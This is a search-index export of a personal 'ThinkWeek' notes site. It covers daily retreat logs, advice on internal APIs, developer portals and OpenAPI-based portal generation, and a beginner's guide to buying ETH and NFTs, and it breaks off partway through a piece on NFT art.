{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Introduction","text":"<p>After learning of the concept of thinkweek, I've been eager to experience it myself.</p>"},{"location":"#what-is-thinkweek","title":"What is ThinkWeek","text":"<p>The following figure from Reservations.com sums up the practical aspects of a Think Week. </p>"},{"location":"day1/","title":"Day 1 - 31.05","text":"<p>The first day has been productive and the absence of disturbances has had a significant impact on focus.</p>"},{"location":"day1/#topic-of-toyday-smart-contract","title":"Topic of toyday - Smart contract","text":"<p>The topic of today has been Smart contracts. I've been able to dig deep down into the core in order to get a good understanding. Particularly, doing a code review of an example ERC721 contract has helped my understanding. </p> <p>There are still some remaining topics within this area I plan to cover on day 2.</p>"},{"location":"day1/#office-setup","title":"Office setup","text":"<p>The office setup has worked very well. I brought a ultrawide monitor and setup in the living room of the cabin. I've also brought a small whiteboard (1mx1.5m) for structuring thoughts.  </p>"},{"location":"day1/#tools","title":"Tools","text":"<p>The toolchain setup for structuring and publishing my notes has worked very well and it has been important that this was prepared in advance. The tool chain consist of a github repo with notes in markdown. On every commit, a github action is triggered which runs mkdocs and publishes the content to https://elsewhat.com/thinkweek-dparnas-2021/</p>"},{"location":"day1/#time-schedule","title":"Time schedule","text":"<p>The day started at 07:30 before breakfast and has typically had a 1 time focus slot followed by a break.  Approximately once every two hours, I've gone outside for short walk to clearing my head.</p> <p></p>"},{"location":"day2/","title":"Day 1 - 1.4","text":""},{"location":"day2/#topic-of-toyday-shifting","title":"Topic of toyday - Shifting","text":"<p>The topic of day 2 was a bit less structured than day 1. As the results for day 1 was active in my head, I decided to continue down that path for a second final day. </p> <p>The first half on was spent on:</p> <ol> <li>Summarizing day 1</li> <li>Investigating level 2 blockchains and how they could interact with the main Ethereum blockchain. </li> <li>Brainstorming about smart contracts of everyday life in Norway</li> </ol> <p>In order to do the brainstorming about smart contracts of everyday life, I did a structuring of various of existing usage of smart contracts.</p> <p>I then decided this structuring of existing usage was a excellent deliverable from this day and made this available in the Smart contract usage section</p>"},{"location":"day2/#time-schedule","title":"Time schedule","text":"<p>Today, I've overextended and underestimate the work load required so it was a quite taxing day.  For the next day two days I'll focusing on World class APIs and will use the first day for research and structuring the deliverables.</p> <p>Had a some walks in the alpine slope here and there are still some patches of snow </p>"},{"location":"day3/","title":"Day 1 - 2.4","text":""},{"location":"day3/#topic-of-toyday-world-class-apis","title":"Topic of toyday - World class APIs","text":"<p>Day 3 was dedicated as a research day for API related topics. The plan was not write any content.</p> <p>Watched Developer Empathy from Nordic APIs</p> <p>Adam DuVander presented there and had some interesting points, especially this figure caught my attention </p> <p>I therefore started reading his book \"Developer Marketing does not exist\" which I will finish on day 4. </p> <p>Some other interesting presentations watched:</p> <p>API-as-a-product  </p> <p>Take Your API Docs from 406 Not Acceptable to 200 OK  </p> <p>We Are Not Restful Anymore. . . And Its Fine</p> <p>What's Your Problem?</p>"},{"location":"day3/#time-schedule","title":"Time schedule","text":"<p>Gotten a nice rythm today on research. </p> <p>Had a nice long walk and stayed dry untill almost the end. facepalm </p> <p>The lack of human interaction is noticable though and find myself wanting outside stimuli. Had some phone calls with family. Oh and by the way, got a fly companion into the cabin. I call him Alfred.</p>"},{"location":"day4/","title":"Day 4 - 3.4","text":""},{"location":"day4/#topic-of-toyday-internal-apis-and-developer-portals","title":"Topic of toyday - Internal APIs and developer portals","text":"<p>First half of the day was spent on research, watching more videos and reading up on other people's presentations. </p> <p>API the docs conference was interesting and I looked through all presentations from 2020 and 2021.</p> <p>The presentation \"Internal Developer Portals: Developer Engagement Behind the Firewall\"  by Kristof Van Tomme resonated with me and made me realize the needs for an internal API and its developer portal by both API consumers and API producers are different than those for the APIs of an internet native company.</p> <p>Therefore, I pivoted a bit on the deliverable to focus on the needs of API consumers and API producers related to internal APIs and their developer portal.</p>"},{"location":"day4/#time-schedule","title":"Time schedule","text":"<p>Today, I've spread the work more even across the full day from 8-21 with long breaks and \"free time\" in between. The experience has been good, but it has been important to stop the watching video presentations research as it wears down my energy.</p> <p>Albert says hi. </p>"},{"location":"day5/","title":"Day 1 - 4.4","text":""},{"location":"day5/#topic-of-toyday-internal-apis-and-developer-portals","title":"Topic of toyday - Internal APIs and developer portals","text":"<p>Getting ideas down to paper and focusing on completing the topic has been the focus for today. Parts of this felt like writing down things I already, but for other parts it was a nice way of structuring my thoughts.</p>"},{"location":"day5/#time-schedule","title":"Time schedule","text":"<p>A bit shorter day as I'm not spending the night in the cabin. </p> <p>Have not seen Albert today :(</p>"},{"location":"future-of-work-and-daos/","title":"Future of Work and the rise of DAOS","text":"<p>Planned for day 4</p>"},{"location":"internal-apis/","title":"Internal APIs and developer portals","text":"<p>There exist a lot of material on the importance of APIs and developer portals and how they are essential for the growth of companies like Twilio and Stripe.  There is less information available on APIs and developer portals internally in large organisation (and sometimes made available to their closest business partners). </p> <p>The presentation \"Internal Developer Portals: Developer Engagement Behind the Firewall\"  by Kristof Van Tomme gives a high level overview of common frustrations:</p> <ol> <li>Poor discoverability </li> <li>Domain language ambiguity</li> <li>Lack of API design standards and inconsistent developer experience</li> <li>Lack of documentation</li> <li>Fragmented and complex authentication</li> </ol> <p>As he also mentions, there is a lot of focus on the developer experience of API consumer but very little on API producers.  In my personal opinion, if you have have a structured and easy process for API producers, you will see an significant increase in the information available to API consumers. </p> <p>In this area we will look at three main areas: </p> <ol> <li>Developer mindset</li> <li>Developer experience for API consumers</li> <li>Developer experience for API producers</li> </ol>"},{"location":"internal-apis/api-portal/","title":"API portal ideas","text":"<p>Start page with all internal APIs and filtering on the left hand side</p> <p></p> <p>Detail page of a single internal API</p> <p></p>"},{"location":"internal-apis/api-portal/#automated-generation-of-the-api-portal-based-on-openapi-contract","title":"Automated generation of the API portal based on OpenAPI contract","text":"<p>Let's see how well we could automatically generate this based on the OpenAPI contract.  OpenAPI specification 3.1.0 is available in Github and defines the fields available</p>"},{"location":"internal-apis/api-portal/#api-card","title":"API card","text":"<pre><code>API name = info.title\nAPI elevator statement = info.summary\nlast update needs to come from API portal update timestamp\n</code></pre>"},{"location":"internal-apis/api-portal/#api-details","title":"API details","text":"<pre><code>API name = info.title\nAPI elevator statement = info.summary\nAPI description = info.description &lt;= Structured through markdown\nAPI version = info.version\n</code></pre>"},{"location":"internal-apis/api-portal/#api-contact-details","title":"API contact details","text":"<pre><code>API contact = contact.name\nAPI contact email = contact.email\nContact points = externalDocs.description + externalDocumentationObject.url (which can link to a slack channel)\n</code></pre>"},{"location":"internal-apis/api-portal/#api-resources-overview","title":"API resources overview","text":"<p>API resources comes from tags. Redoc has an extension x-tagGroups and similar patternt is been investigated for OpenAPI specification.</p> <pre><code>//If x-tagGroups exist perhaps only use the highest level?\nAPI resource name = tag.name\nAPI resource short description = tag.description\ntag.externalDocs also exist and could point to url with more information\n</code></pre>"},{"location":"internal-apis/api-portal/#releases","title":"Releases","text":"<p>Release notes must be maintained outside of OpenAPI specification. Planned / ongoing releases likely also needs to be maintenance in a different manner. </p>"},{"location":"internal-apis/api-portal/#report-issue","title":"Report issue","text":"<p>Report issue is likely maintained outside of OpenAPI specification (though in theory specification extensions are allowed). Should lead the user into the service management portal of the company and in addition the contact points of the API</p>"},{"location":"internal-apis/developer-mindset/","title":"Developer mindset","text":"<p>It's important to know that you don't do marketing to developers. </p> <p>The focus must be on: </p> <ol> <li>Describing the business context for your API</li> <li>Provide the details to get started</li> <li>Provide the specification for the API contract</li> <li>Operational aspects such as uptime monitoring, error logs, usage logs and alert systems</li> <li>Facilitate a community including the developers consuming the API, the team responsible for DevOps and their product owners</li> <li>Feature request process</li> <li>Transparency on product backlog items for future releases</li> <li>Release notes for updates</li> </ol>"},{"location":"internal-apis/dx-consumer-first-breaking-change/","title":"First breaking change","text":"<p>The general trend for REST APIs and versioning is to use API evolution.</p>"},{"location":"internal-apis/dx-consumer-first-breaking-change/#deprecation-through-releases","title":"Deprecation through releases","text":"<p>API consumers should be made aware of deprecation:</p> <ol> <li>When deprecation is planned, the API producer team should analyse which API consumers are currently using the endpoints which will be affected by deprecation and inform contact persons</li> <li>Through API release notes</li> <li>Through their own monitoring of API requests returning a <code>Sunset</code> HTTP header</li> </ol> <p>API producers are encourage to not remove deprecated features before all API consumers have moved to the now recommended alternative.</p>"},{"location":"internal-apis/dx-consumer-first-experience/","title":"First experience","text":"<p>We define the first experience as the steps required in order to perform the first call of the internal API. </p>"},{"location":"internal-apis/dx-consumer-first-experience/#minimize-setup-required","title":"Minimize setup required","text":"<p>In general, we want to minimize the steps required for setting up.  For an internal API the following steps might be required: </p> <ol> <li>Get a subscription/API key from the API Portal</li> <li>OAuth2 authentication setup - Create client app registration and add internal API dependency</li> <li>OAuth2 authentication approval from admin</li> <li>Apply for authorization roles in back-end system</li> <li>Apply for authorization roles in API</li> <li>Execute the first request in your prefered tool such as postman or curl</li> </ol> <p>If possible, simplify this setup.</p> <p>The full process, start to finish, should be described in the API portal (regardless of the fact that the API DevOps team is not responsible for authorization roles in the backend system or OAuth2 authentication setup approval. </p> <p>Note that this process for internal APIs will in many cases be identical for several APIs so the content describing it can be shared.</p>"},{"location":"internal-apis/dx-consumer-first-experience/#getting-started","title":"Getting started","text":"<p>Getting started guide is essential to streamline the process of onboarding new API consumers.</p> <p>Make sure you keep it focused and to the point, the getting started guide is not an owners manual. </p> <p>An analogy to this is if you buy a new car. The car salesperson will use a few minutes with you to explain the core features of the car. The salesperson does not however hand you the owner's manual and tell you to study it before you drive out from the dealership. </p>"},{"location":"internal-apis/dx-consumer-first-feature-request/","title":"First feature request","text":"<p>For internal APIs, most of the backlog consist of feature request from ongoing initiatives/projects. Therefore, most developers will need to request new features to the internal API and will be dependent on them being delivered before they can achieve their business outcome. </p>"},{"location":"internal-apis/dx-consumer-first-feature-request/#release-plan-transparency","title":"Release plan transparency","text":"<p>API producer DevOps teams need to ensure transparency of your upcoming releases and the planned content. In addition, there should be transparency of all feature requests coming from API consumers. </p> <p>A developer friendly way of doing this, is to use Github issues and milestones for high level representation. </p> <p>This allows the developers to see ongoing work and avoid creating duplicate user stories. </p>"},{"location":"internal-apis/dx-consumer-first-feature-request/#mature-api-contract-together","title":"Mature API contract together","text":"<p>The API contract for feature requests should be a combined effort between the API producer and the API consumer requesting it.  Documentation for the endpoint under maturing should be provided in a branch outside of the main release branch.</p> <p>Only when the endpoint is in production, is it merged into the main documentation.</p>"},{"location":"internal-apis/dx-consumer-first-feature-request/#low-bar-for-reaching-out","title":"Low bar for reaching out","text":"<p>Provide a slack channel for your API, where developers can ask informal questions for example on feature requests.  Have the slack channel become the home of a community of API consumers and the API producer DevOps team. </p>"},{"location":"internal-apis/dx-consumer-first-impressions/","title":"First impressions","text":"<p>The first time a developer learns of a new internal API is often through a presentation, an internal slack message, referal from a colleague or at the request of a product owner.  In general, developers are from the offset somewhat skeptical of consuming new internal APIs as it's a new dependency against another team with different priorities and from experience the maturity of internal API varies alot. </p>"},{"location":"internal-apis/dx-consumer-first-impressions/#gather-information","title":"Gather information","text":"<p>The first step will be to gather information on the internal API. There are three major sources: </p> <ol> <li>API Portal (hopefully the company has one common one where OpenAPI contracts are published)</li> <li>Enterprise search - Search engines covering internal material in the company such as presentations or work documents etc. Also includes searches on microblogging platforms such as slack and yammer. All this information may be outdated</li> <li>Code search - Search for code repositories internally in the organisation (typically github)</li> </ol> <p>As you can see from the above sources there are several challenges: </p> <ol> <li>API Portal usually leads the developer directly into the OpenAPI contracts without any additional context. Most internal APIs will have a barebone OpenAPI contract not describing the business context, but just listing individual endpoints</li> <li>Enterprise search may lead you to outdated information or irrelevant information (for example it's not unusual that two APIs have almost the same name)</li> <li>Code search have you start at the lowest possible level and it will be hard to understand the big picture on what the API supports</li> </ol> <p>If the information is insufficient, the next step for the developer will be to identify if they know someone who works with the API or at least knows someone who does. If the company does not have a vibrant developer community or has organsiational silos, the developer may give up and report back to the product owner. In this case, the product owner needs to go through the line organisation and request the responsible team to setup a workshope with his team.</p>"},{"location":"internal-apis/dx-consumer-first-impressions/#action-strengthen-the-api-portal","title":"Action: Strengthen the API portal","text":"<p>The key to improving the situation, is to strenghten the API portal beyond the OpenAPI contract.  It needs to provide business context information for APIs in a consistent manner and the expectations on the level of quality of the information in the OpenAPI contract must be raised.</p> <p>Grouping of APIs should be done over both business processes and source systems.</p> <p>Mercedes-benz developer experience can be an inspiration (even though it's not an internal API portal) </p> <p></p> <p>\"Leveraging API Docs and Tools at Mercedes-Benz developers\" presentation is useful to better understand their concept.</p>"},{"location":"internal-apis/dx-consumer-first-impressions/#technical-details","title":"Technical details","text":"<p>The most mature API projects with the highest potential of reuse should be involved and help get an improved API portal in place. </p> <p>The content itself needs to be easily maintained by API producers (with possibility for API consumers to contribute). To facilitate this, using markdown and github respoitory as content store is a good choice. </p> <p>The developer experience of the API portal will evolve over time, and I believe the company should control it themselves on top of an open-source stack.  I would prefer a static site generator (such as Jekyll or Mkdocs) publishing to Github pages. This architecture would need a customized build tool which queries the API portal software through APIs for all published OpenAPI contracts. Github actions is a good fit for this responsibility. This step will ensure APIs under development with no custom content in markdown are also represented in the overall API portal.</p>"},{"location":"internal-apis/dx-consumer-first-operational-issue/","title":"First operational issue","text":"<p>Operational issue will happen before or later. One of the first actions of the API consumer is to identify the root cause. </p>"},{"location":"internal-apis/dx-consumer-first-operational-issue/#operational-monitoring","title":"Operational monitoring","text":"<p>API consumers should be able to access status pr API on uptime. This should automatically be updated based on health checks running continously. </p>"},{"location":"internal-apis/dx-consumer-first-operational-issue/#low-bar-for-reaching-out","title":"Low bar for reaching out","text":"<p>Provide a slack channel for your API, where API producers can inform of downtime and the actions being taken to recover operational status.</p>"},{"location":"internal-apis/dx-consumer-first-operational-issue/#post-mortem","title":"Post mortem","text":"<p>After any significant downtime, the API producers should supply the API consumers on a post mortem report on the root cause for the downtime and mitigating actions taken in order to reduce the likelihood of similar issues in the future. </p>"},{"location":"internal-apis/dx-consumer-first-use-case/","title":"First use case","text":"<p>Once the first success is achieved, the developer likely wants to chain several API requests in order to achieve a business outcome. In many cases, the developer is not a domain expert and has only gotten vague input from product owner on what the goal is. </p>"},{"location":"internal-apis/dx-consumer-first-use-case/#provide-business-context","title":"Provide business context","text":"<p>The API portal description should provide business context. For example, describe the difference between a corrective-work-order and preventive-work-order resource.</p> <p>This may be challenging for the API producer DevOps team to create, so ensure the product owner dimension is involved. </p>"},{"location":"internal-apis/dx-consumer-first-use-case/#low-bar-for-reaching-out","title":"Low bar for reaching out","text":"<p>Provide a slack channel for your API, where developers can ask informal questions for example how they best can achieve their wanted business outcomes. Do not force them to register a support ticket or similar as developers will postpone this untill they have exhausted all other options. </p> <p>Have the slack channel become the home of a community of API consumers and the API producer DevOps team. More often than not, you will see API consumers helping each other out. </p>"},{"location":"internal-apis/dx-consumer-first-use-case/#provide-tools-for-grouping-api-request","title":"Provide tools for grouping API request","text":"<p>Encourage the use of tools like postman, where developers can setup a collection of API request they need to achieve their wanted business outcome. </p> <p>The API producer DevOps team should be responsible for maintaining a reference postman collection of typically API request grouped in a natural manner (as a golden rule, one request pr example of an endpoint in the OpenAPI contract).</p>"},{"location":"internal-apis/dx-consumer-overview/","title":"Developer experience for API Consumer","text":"<p>In Adam DuVander  book \"Developer Marketing does not exist\" this figure caught my attention. </p> <p>He writes the following to explain the figure: \"The first impression colors how a developer approaches your company. Next, once a developer has chosen to give you a shot comes that initial experience, the thing you might mistakenly call the developer experience. While getting started is important, it's only the start. You next need to help a developer become successful, which will give them a higher likelihood of becoming a customer. Finally, they'll still need a great ongoing developer experience. Their last visit-as in the most recent- becomes important.\"</p> <p>This has several similarities on what in the UX community is refered to as a Journey map and is a powerful tool to understanding the mindset of a person and their actions over time. </p> <p>For internal APIs, the initial figure needs some extentions: </p> <ol> <li>First feature request: The functonality of the internal API is very often driven by the demands of the API consumers. Typically, several intiatives/projects will sponsor new parts for it. Developers will be actively seeking information on if the API can fulfill their current needs and if not provide detailed feature requests for new functionality</li> <li>First operational issue: Sooner or later, the API consuming solution will face downtime for users. The root cause will need to be identified and internal APIs are one possible source. </li> <li>First release: Developers need to be aware of new releases of the API in order to evalate potential impact and new possibilities</li> <li>First breaking change: Sooner or later, the API will have a breaking change (or a new version introduce). This may require an update in the API consuming solution and must be planned</li> </ol>"},{"location":"internal-apis/dx-producer-drive-adoption/","title":"Drive adoption","text":"<p>An API in itself doesn't deliver value before it's consumed so it makes sense to spend effort on marketing the internal API to potential internal consumers. The more API consumers an internal API has, the more more value will it deliver and will evolve quicker due to increased funding.</p>"},{"location":"internal-apis/dx-producer-drive-adoption/#sharing","title":"Sharing","text":"<p>The product owner together with representatives of the DevOps team should actively present the current status and plans for the internal API.  This can be as a general presentation, but also directly to owners of systems where there may be a potential. </p> <p>By sharing information on the internal API and lessons learned, you at the same time increase the knowledge of the internal API to the audience and this might be just the thing which creates a new API consumer in the future. </p>"},{"location":"internal-apis/dx-producer-drive-adoption/#onboarding-process","title":"Onboarding process","text":"<p>Make the onboarding process for potential API consumers as simple as possible. Point them directly to the relevant information and follow up the progress or any questions they may have. </p> <p>If a potential API consumer has a use case where the internal API already has 80% of the functionality, but is missing the last 20%, prioritize the maturing and implementation of the delta functionality high compared to other requests.</p>"},{"location":"internal-apis/dx-producer-drive-adoption/#leads","title":"Leads","text":"<p>Be active and follow up leads. Be aware of ongoing initiatives and think of if the internal API can deliver value there.  Reach out to them informally to discuss the possiblities. </p>"},{"location":"internal-apis/dx-producer-drive-adoption/#find-new-ways-of-consuming-the-api","title":"Find new ways of consuming the API","text":"<p>If there is a low-code trend in your, company make sure you treat them as other API consumer and do what you can to make the onboarding process as simple as possible. If a lot of business users are using excel, investigate how you can make the API available there.  If a lot of business users are using command lines scripts,  investigate how you can make the API available there. </p>"},{"location":"internal-apis/dx-producer-drive-adoption/#enterprise-architecture","title":"Enterprise architecture","text":"<p>If your company has an enterprise architecture portal, ensure the internal API is properly represented there and points to the API portal for more information.</p>"},{"location":"internal-apis/dx-producer-establish/","title":"Establish internal API","text":"<p>Establishing a new API and performing a successful end-to-end call can be a daunting task the first time it's performed.  Here are a few of the steps typically involved: </p> <ul> <li>Create OpenAPI contract</li> <li>Upload OpenAPI contract to API portal</li> <li>Define policies in API portal</li> <li>Create API implementation as docker container</li> <li>Host API docker container</li> <li>Network architecture for communicating with back-end database/system from API docker container host</li> <li>Authentication</li> <li>OAuth2 authentication setup - Create client app registration and add internal API dependency</li> <li>OAuth2 authentication approval from admin</li> <li>Get a subscription/API key from the API portal</li> </ul>"},{"location":"internal-apis/dx-producer-establish/#scaffolding","title":"Scaffolding","text":"<p>The establish phase is not executed very regularly executed by a single team and these kinds of process are typically not well documented end-to-end.  However, multiple teams in your company will do the exact thing and typically will have to go through the same learning experience. </p> <p>To allieviate this: </p> <ul> <li>Encourage the use of scaffolding tools such as Yeoman</li> <li>Document the end-to-end process (well suited for a video)</li> <li>Facilitate contact between teams of different API experience level</li> </ul>"},{"location":"internal-apis/dx-producer-establish/#dont-forget-the-api-consumer","title":"Don't forget the API consumer","text":"<p>The definition of done for establishing an internal API is usually I can execute a request and get a response.  But remember to cater for current and potential API consumers. Ensure the API producer take pride in their entry in the API portal and take the effort to describe the information an API consumer would be interested in.</p>"},{"location":"internal-apis/dx-producer-first-release/","title":"First release","text":"<p>The first release of an internal API is always an important milestone. In this process, it's easy to lose focus on the API consumer(s) in this process and what they need in order to create value for the business based on the API.</p>"},{"location":"internal-apis/dx-producer-first-release/#api-consumer-focus","title":"API consumer focus","text":"<p>Do not finalize the release before the API consumer has the information they need. Test your documentation by having someone in the team setup a API consumer using only the information they find in the documentation. </p>"},{"location":"internal-apis/dx-producer-first-release/#release-notes","title":"Release notes","text":"<p>Create release notes for the first release and focus on what functionality is available to business consumers.</p> <p>Drive adoption by making these release notes available inside your company and not just for the intended API consumer.  API portal could have a feed showing the latest release with corresponding release notes. </p>"},{"location":"internal-apis/dx-producer-first-release/#monitoring","title":"Monitoring","text":"<p>After going live, monitor the request/response log based on the activity of the API consumers.  In many cases, you will discover they use the endpoint in a different manner than you expected or perhaps you will find edge cases where request have failed for example due to missing encoding of special characters in parameters. </p> <p>Over time, you'll want to automate this process. For example, you could have a batch job running in the morning reporting all failed requests into a slack channel monitored by the DevOps team.</p>"},{"location":"internal-apis/dx-producer-maturing/","title":"Maturing features","text":"<p>In order to fullfil a business outcome, there is likely a set of endpoints and resource models in the OpenAPI contract to be defined.</p> <p>To do this it's essential to understand:  </p> <ul> <li>The flow in the first API consumer application</li> <li>How the resources are represented in the data model of the back-end</li> <li>Business process context the API consumer application and the back-end relate to</li> </ul>"},{"location":"internal-apis/dx-producer-maturing/#involve-api-consumer","title":"Involve API consumer","text":"<p>Involve the API consumer in the maturing. Understand how the API endpoints will be used and what kind of data the front-end has available at that point of time. </p> <p>Create a branch of the OpenAPI contract for maturing the feature.  As early as possible, use a mock server or a dev instance of the API portal to have the new planned endpoints return mock data for testing by the API consumer. Generate documentation for the new planned endpoints of OpenAPI contract as this is more understandable than the raw OpenAPI file for many API consumers. </p> <p>In most cases, the internal funding for the implementation comes from the API consumer side.</p>"},{"location":"internal-apis/dx-producer-maturing/#who-to-involve-in-the-maturing","title":"Who to involve in the maturing?","text":"<p>This is an area where there are many different elements which must be balanced. </p> <p>Usually there is 1-2 persons in a DevOps team which are the drivers for the structures and principles of the OpenAPI contract.  The DevOps team is typically mid-sprint when the maturing is natural to perform, and their minds are focused on the deliverables of the current sprint and not on potential future needs. The product owner from the business typically has broad base of domain knowledge and has access to specialist for concrete cases. However, they are typically not the drivers for the details in the OpenAPI specification. </p> <p>In my experience, meetings with 3+ participants where the goal is create an OpenAPI contract definition from scratch for a new feature rarely are efficient. It's better to have a draft be created in advanced and then this can be presented and adjusted after discussions. However, this approach makes the process dependant on individual persons and if they are away it may stop maturing process. To mitigate this, it's important to involve the whole DevOps team in the code review of the OpenAPI specification and ensure they know the necessary tooling for updating it.</p>"},{"location":"internal-apis/dx-producer-maturing/#domain-knowledge","title":"Domain knowledge","text":"<p>Seek out business process description and governing documents for the area.  Use precise terminolgy and prefer naming taken from international standard where appropriate</p>"},{"location":"internal-apis/dx-producer-maturing/#openapi-contract-source-when-code-is-implemented","title":"OpenAPI contract source when code is implemented","text":"<p>TBD</p>"},{"location":"internal-apis/dx-producer-operational/","title":"Operational excellency","text":"<p>The DevOps team should be given the mandate to automate as much of the operational tasks as possible. </p>"},{"location":"internal-apis/dx-producer-operational/#uptime-monitoring-for-api-consumers","title":"Uptime monitoring for API consumers","text":"<p>In the API portal, have a common pattern for API uptime monitoring where the focus group is API consumers. For example, each API could have a health endpoint which performs an end-to-end call and has a standard payload. </p> <p>Have an uptime status page where all the health statuses are presented. Overtime, this can be extended to provide alerts based on a publish/subscribe pattern. </p>"},{"location":"internal-apis/dx-producer-operational/#uptime-monitoring-for-api-producer","title":"Uptime monitoring for API producer","text":"<p>Do automated tests at least every hour through a background script and send alerts on failure to the DevOps team (for example through slack) It should be a clear goal that the DevOps team should be aware of issues and working on resolving them, before it is reported by API consumers.</p>"},{"location":"internal-apis/dx-producer-operational/#operational-issues","title":"Operational issues","text":"<p>Prepare a process for how to handle operational issues which require an emergency change.  Include responsibilities and stepwise explanation on how to continously inform affected API consumers of the progress.</p>"},{"location":"internal-apis/dx-producer-operational/#monitoring-of-users-with-missing-authorization","title":"Monitoring of users with missing authorization","text":"<p>A very common error in internal APIs, is that the end-user is missing some rights in the back-end system.  Provide detailed error messages in these cases and work with API consumers on how to reduce the likelihood of such cases.</p>"},{"location":"internal-apis/dx-producer-operational/#expiring-keys-and-certificates","title":"Expiring keys and certificates","text":"<p>Have a calendar for expiring keys and certificates and make sure their are update well in advance of the expiry.</p>"},{"location":"internal-apis/dx-producer-overview/","title":"Developer experience for API producer","text":"<p>An API in itself doesn't deliver value before it's consumed. The choices and actions the API producers make when creating the API have a strong correlation to the likelihood the API will deliver value to additional API consumers and evolve over time.</p> <p>For internal APIs there are in general three typical starting points:</p> <ol> <li>API for connecting front-end and back-end of one system</li> <li>API for exposing data from one back-end system to another front-end system</li> <li>API for exposing data from one back-end system to another back-end system</li> </ol> <p>A common scenario is that APIs start as 1. and then evolve over time to include to 2. and possibly 3. Each of these evolution typically have a significant fricition due:</p> <ul> <li>Technical debt of using API in way it was not initially designed for</li> <li>API initially specialized to snuggly fit the first consumer front-end</li> <li>Different authentication methods</li> <li>Creating a dependency between DevOps teams</li> </ul> <p>To reduce this friction and realize potential value, it's essential to take into consideration future API consumers from the start. </p> <p>Companies investing in digitalization programs, quickly see the first initiatives are using most of their effort on making data and functions available and not on combining them in novel new ways creating business growth. To achieve business agility, APIs must be the foundation layer already in place and ready to be used.</p>"},{"location":"internal-apis/dx-producer-release-strategy/","title":"Release strategy","text":"<p>Have a predicatable process around release and ensure API consumer are aware of it.  Having a fixed release schedule for new functionality every two weeks or every month can provide a more predictable planning for the API consumers.  A fixed release schedule will likely ease frictions when several API consumer have different prioritize on what should be delivered first. </p>"},{"location":"internal-apis/dx-producer-release-strategy/#release-epic","title":"Release epic","text":"<p>Plan releases so that there is a main focus for the release. This can for example be several endpoints for a new resource or supporting a new use case from start to finish. </p>"},{"location":"internal-apis/dx-producer-release-strategy/#bugfixes","title":"Bugfixes","text":"<p>Fix bugs as quickly as possible if they are important for API consumers. If there is a bug identified in the morning, ideally it should be fixed by lunch.  If this is possible, work with the API consumers to find a suitable workround.</p>"},{"location":"smart-contract-usage/","title":"Smart contract usage","text":"<p>Decentralized applications using smart contracts on the blockchain as a backend have a tremendous momentum.  Multiple use case has already been discovered, but it's still early days and has a significant risk involved. </p> <p>Early adopters need to be extra careful with scams, unintentional errors in smart contracts, high transaction cost and so on. </p> <p>During my ThinkWeek I've looked into various existing use cases that already show potential. This is not intended to be an exhaustive list but to show prominent examples of the various types.</p>"},{"location":"smart-contract-usage/#getting-started-as-a-user","title":"Getting started as a user","text":"<p>It may seems daunting at first to get started as user of smart contract projects.  There definitively will be innovation on simplifying the user setup, but for technical adapt persons it's quite straightforward already today</p>"},{"location":"smart-contract-usage/#step-1-get-yourself-a-hardware-wallet","title":"Step 1: Get yourself a hardware wallet","text":"<p>To me, a hardware wallet is a must if you are going to own items of significant value.  It mitigates risk related to virus, keyloggers, rogue extension as the transaction signing is done on the device. Recommend the Trezor One which cost approximately 50 euros.</p>"},{"location":"smart-contract-usage/#step-2-acquire-some-eth","title":"Step 2: Acquire some ETH","text":"<p>Almost all smart contract projects today are running on the Ethereum blockchain, so to interact you need to own the currency ETH. </p> <p>A simple way of acquiring ETH in Norway is to use the MiraiEx exchange. It's registered with the Norwegian Finanstilsynet, you log on with Vipps and has simple support moving NOK from norwegian banks. Please don't aquire more ETH than you can afford to lose.</p> <p>Once you have acquired some ETH in MiraiEx, you need to move it to your hardware wallet. To do this, you create an Ethereum account on your hardware wallet and supply this address to a withdrawl transaction from MiraiEx.</p>"},{"location":"smart-contract-usage/#step-3-install-metamask","title":"Step 3: Install MetaMask","text":"<p>MetaMask has become the defacto interface to blockchain apps (it's also a wallet). Whenever you navigate to a site which sells smart contract projects, it will typically ask you to log on to MetaMask and this will represent your user.</p> <p>You will then connect your hardware wallet as an account in MetaMask. The instructions are found in How to connect a Trazor or Ledger Hardware Wallet.</p>"},{"location":"smart-contract-usage/#step-4-log-in-to-marketplace","title":"Step 4: Log in to marketplace","text":"<p>https://opensea.io/ is the dominant marketplace and will allow trade regardless of where the NFT token was initially created. </p>"},{"location":"smart-contract-usage/#step-5-stay-up-to-date","title":"Step 5: Stay up to date","text":"<p>Twitter and Discord are the two main channels to keep any eye out for what is happening in the space. Each project typically has their own discord environment where there is alot of activity between collectors.</p>"},{"location":"smart-contract-usage/#step-6-buy-your-first-nft","title":"Step 6: Buy your first NFT","text":"<p>A lot of NFTs have a current listing price. By clicking Buy Now in Opensea, the MetaMask plugin will ask you to confirm the transaction and the expected transaction cost (called gas in Ethereum). Once the transaction is completed, the NFT is immediately available in your account which resides in the hardware wallet. If the transaction cost supplied is lower than the rest of the market, miners will add your transaction to the blockchain and you will be left waiting. If this is the case, you can go to MetaMask and select speed up transaction. Here you can set the transaction cost as fast and it will likely be completed in a few seconds. Do not cancel the transaction as then you still pay the transaction cost. </p> <p>Some NFTs are up for auction. You then typically use wrapped ETH (WETH) which allows you to bid on many items in parallell (even if you don't have the balance to buy them all). Convert 1-1 between ETH and WETH in MetaMask.</p>"},{"location":"smart-contract-usage/#step-7-enjoy-your-tax-return","title":"Step 7: Enjoy your tax return","text":"<p>Tax return will be come a bit more complicated and not all rules are in place for NFTs. Norwegian Skatteettaten has some information at Skatte- og merverdiavgiftsmessig behandling av bitcoins og andre virtuelle valutaer and Krypto for kongeriket recently had a stream called Skatt og Krypto til Frokost: Bitcoin, DeFi og NFT | OBC, EY &amp; Skatteetaten shown below</p>"},{"location":"smart-contract-usage/art/","title":"Art","text":"<p>Art has been central in the NFT space, but traditional artist have not set their mark.  Sales of artwork are in many cases seen as patronage by collectors. </p> <p>Many of the art project has novel ideas such as Ghxsts ability to combine two works or The Underground Sistine Chapel being broken into over 400 pieces and one of them contained the signature of the work. </p>"},{"location":"smart-contract-usage/art/#beeple","title":"Beeple","text":"<p>Significance: Pioneer in 3D digital arts and NFTs Editions: Typically 1 \"In May 2007, the digital artist known as Beeple set out to create and post a new work of art online every day. He hasn\u2019t missed a day since, creating a new digital picture every day for 5,000 days straight. Individually known as EVERYDAYS, collectively, the pieces form the core of EVERYDAYS: THE FIRST 5000 DAYS, one of the most unique bodies of work to emerge in the history of digital art.</p> <p>Consumers of internet culture will already be familiar with the prolific digital output of graphic designer and motion artist Mike Winkelmann, better known as Beeple. The South Carolina-based artist\u2019s visionary, and often irreverent, digital pictures launched his meteoric rise 